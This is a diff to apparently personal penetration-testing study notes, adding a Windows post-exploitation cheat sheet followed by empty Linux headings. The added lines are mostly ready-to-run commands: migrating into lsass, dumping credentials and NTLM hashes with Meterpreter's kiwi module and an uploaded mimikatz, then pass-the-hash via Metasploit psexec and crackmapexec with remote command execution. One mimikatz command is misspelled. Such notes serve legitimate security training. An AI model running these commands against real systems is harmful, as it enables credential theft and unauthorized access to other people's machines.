@@ -141,3 +141,37 @@ that is a part of the local administrators group on the Windows target system
    `set LHOST`
 - OR you can run [this](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) on windows system `. .\PowerUp.ps1` `Invoke-PrivescAudit` if not working try `powershell -ep bypass` then run the script
 ###### Dumping Hashes With Mimikatz
+- `pgrep lsass` then `migrate [pid for lsass]`
+- With kiwi module
+	`load kiwi` -- to load the utility (use it after getting meterpreter session)
+	`creds_all` -- to dump all the credential
+	`lsa_dump_sam` -- it will dump all NTLM hashes
+   - Now with mimikatz
+	   `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
+	   `shell`
+	   `.\mimikatz.exe`
+	   `prvilege::debug` -- if gives Privilege '20' ok then you have required privilege in order to perform hash extraction from memory
+	   `lsadump::sam`
+	   `sekurlsa::logonpasswords`
+
+###### Pass-The-Hash Attacks
+- `hashdump` -- copy LM and NT hash
+- Using msfconsole module
+	- `use exploit/windows/smb/psexec`
+	- `LPORT 4422` -- different from meterpreter session
+	- `set RHOST [target IP]`
+	- `set SMBUser [username]`
+	- `set SMBPass [LM:NT for the user]`
+	- `set target Native\ upload`
+- Using crackmapexec 
+	- `crackmapexec smb [IP] -u [USERNAME] -H "[NT hash]"` -- -H for hash
+	- `crackmapexec smb [IP] -u [USERNAME] -H "[NT hash]" -x "[cmd]"`
+
+
+# Linux
+
+### Frequently Exploited Linux Services
+
+![[Frequently Exploited Linux Services.png]]
+
+### Exploiting Linux Vulnerabilities
